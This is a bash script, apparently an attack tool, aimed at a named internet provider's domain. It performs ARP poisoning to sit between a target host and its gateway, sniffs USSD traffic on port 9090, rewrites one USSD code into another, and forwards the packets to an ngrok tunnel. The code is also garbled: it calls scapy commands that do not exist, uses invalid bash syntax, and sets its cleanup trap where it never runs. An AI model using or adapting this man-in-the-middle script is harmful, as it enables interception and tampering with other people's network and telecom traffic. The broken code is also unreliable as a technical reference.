#!/bin/bash

# Define the target domain
TARGET_DOMAIN="mtninternet.net"

# Get the target IP address
TARGET_IP=$(curl -s http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | tr -d '"')

# Get the gateway IP address
GATEWAY_IP=$(scapy get_gateway_ip)

# Get the MAC address of the gateway
GATEWAY_MAC=$(scapy get_mac $GATEWAY_IP)

# Define the USSD code to intercept and modify
USSD_CODE="*123#"

# Define the modified USSD code to send
MODIFIED_USSD_CODE="*1234#"

# Define the ngrok URL
NGROK_URL="http://localhost:4040/api/tunnels"

# Check if the target domain is valid
if ! [[ "$TARGET_DOMAIN" =~ ^[a-zA-Z0-9]+\.[a-zA-Z]+$ ]]; then
  echo "Invalid target domain"
  exit 1
fi

# Check if the target IP address is valid
if ! scapy isValidIP $TARGET_IP; then
  echo "Invalid target IP address"
  exit 1
fi

# Check if the gateway IP address is valid
if ! scapy isValidIP $GATEWAY_IP; then
  echo "Invalid gateway IP address"
  exit 1
fi

# Check if the gateway MAC address is valid
if ! scapy isValidMAC $GATEWAY_MAC; then
  echo "Invalid gateway MAC address"
  exit 1
fi

# Start ARP poisoning
function start_arp_poisoning() {
  while true; do
    # Send an ARP response to the target host, claiming to be the gateway
    arp_response=$(scapy ARP op=2 pdst=$TARGET_IP hwdst=$(scapy get_mac $TARGET_IP) psrc=$GATEWAY_IP)
    scapy send $arp_response

    # Send an ARP response to the gateway, claiming to be the target host
    arp_response=$(scapy ARP op=2 pdst=$GATEWAY_IP hwdst=$GATEWAY_MAC psrc=$TARGET_IP)
    scapy send $arp_response

    # Wait for 0.5 seconds
    sleep 0.5
  done
}

# Stop ARP poisoning
function stop_arp_poisoning() {
  # Flush the ARP tables of the target host and the gateway
  arp -d $TARGET_IP
  arp -d $GATEWAY_IP
}

# Intercept and modify USSD traffic
function intercept_and_modify_ussd_traffic() {
  while true; do
    # Sniff for USSD traffic to the target domain
    packet=$(scapy sniff filter="tcp dst port 9090")

    # If the USSD code matches the target USSD code, modify it
    if [[ ${packet[TCP].payload} =~ ^$USSD_CODE ]]; then
      packet[TCP].payload=${packet[TCP].payload/$USSD_CODE/$MODIFIED_USSD_CODE}
    fi

    # Send the modified USSD traffic to ngrok
    scapy send $packet dst=$NGROK_URL
  done
}

# Start ARP poisoning
start_arp_poisoning &

# Intercept and modify USSD traffic
intercept_and_modify_ussd_traffic

# Wait for the user to press Ctrl+C
trap "stop_arp_poisoning" SIGINT

wait
